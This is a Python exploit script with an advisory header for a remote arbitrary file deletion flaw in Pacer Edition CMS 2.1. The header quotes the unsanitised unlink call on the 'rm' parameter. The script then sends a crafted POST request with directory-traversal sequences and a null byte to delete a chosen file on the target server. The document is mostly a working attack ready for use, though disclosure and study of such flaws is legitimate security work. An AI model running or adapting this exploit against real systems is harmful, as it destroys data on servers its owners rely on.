#
#
# Pacer Edition CMS 2.1 (rm) Remote Arbitrary File Deletion Exploit
#
#
# Vendor: The Pacer Edition
# Product web page: http://www.thepaceredition.com
# Affected version: RC 2.1 (SVN: 867)
#
# Summary: The &#039;Pacer Edition&#039; is a Content Management System(CMS)
# written using PHP 5.2.9 as a minimum requirement. The Pacer Edition
# CMS was based from Website baker core and has been completely
# redesigned with a whole new look and feel along with many new
# advanced features to allow you to build sites exactly how you want
# and make them, 100% yours!
#
# Desc: Input passed to the &#039;rm&#039; parameter in modules/code/syntax_check.php
# is not properly sanitised before being used to delete files. This can
# be exploited to delete files with the permissions of the web server via
# directory traversal sequences passed within the &#039;rm&#039; parameter.
#
#
# /modules/code/syntax_check.php (line: 99-102):
# ----------------------------------------------------------
#
# if (isset($_REQUEST[&#039;rm&#039;])) {
#   @unlink($_REQUEST[&#039;rm&#039;]);
#   die();
# }
#
# ----------------------------------------------------------
#
#
# Tested on: Microsoft Windows XP Professional SP3 (EN)
#            Apache 2.2.14 (Win32)
#            PHP 5.3.1
#            MySQL 5.1.41
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             liquidworm gmail com
#                             Zero Science Lab
#
#
# Advisory ID: ZSL-2011-5017
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5017.php
#
#
#
# 07.06.2011
#
 
 
import socket
import sys
 
print &#039;\n-------------------------------------------------------------------&#039;
print &#039;\n Pacer Edition CMS 2.1 (rm) Remote Arbitrary File Deletion Exploit&#039;
print &#039;\n-------------------------------------------------------------------\n&#039;
 
if len(sys.argv) < 4:
    print &#039;\nUsage: &#039; + sys.argv[0] + &#039; <target> <port> <file>\n&#039;
    print &#039;Example: &#039; + sys.argv[0] + &#039; 192.168.16.101 80 naked.jpg\n&#039;
    sys.exit(0)
  
host = sys.argv[1]
port = int(sys.argv[2])
file = sys.argv[3]
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((host, port))
s.settimeout(10)
answ = s.recv(1024)
 
s.send(&#039;POST /modules/code/syntax_check.php?rm=..%2f..%2f..%2f..%2f..%2f..%2f&#039; + file + &#039;%00 HTTP/1.1\r\n&#039;
       &#039;Host: &#039; + host + &#039;\r\n&#039;
       &#039;Connection: keep-alive\r\n&#039;
       &#039;Content-Length: 0\r\n&#039;
       &#039;Cache-Control: max-age=0\r\n&#039;
       &#039;Origin: null\r\n&#039;
       &#039;User-Agent: thricer\r\n&#039;
       &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
       &#039;Accept: text/html\r\n&#039;
       &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
       &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
       &#039;\r\n\r\n&#039;)
 
htcode = &#039;HTTP/1.1 200&#039;
      
if htcode not in answ[:len(htcode)]:
    print &#039;- Error deleting file!\n&#039;
    sys.exit(0)
else: print &#039;+ File &#039; + file + &#039;deleted!\n&#039;
 
s.close



